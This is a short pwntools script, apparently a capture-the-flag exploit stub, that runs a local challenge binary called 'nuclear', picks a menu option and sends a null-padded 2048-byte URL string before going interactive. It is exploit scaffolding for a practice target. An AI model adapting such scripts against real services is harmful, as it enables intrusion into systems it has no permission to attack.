#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./ld.nuclear.so --library-path ./ ./nuclear", shell=True)

p.recvuntil("> ")

p.sendline("2")

p.recvuntil("! : ")

payload_url = "afang.xyz" + "\x00"
url = payload_url.ljust(2048, "\x00")

p.sendline(url)

p.interactive()


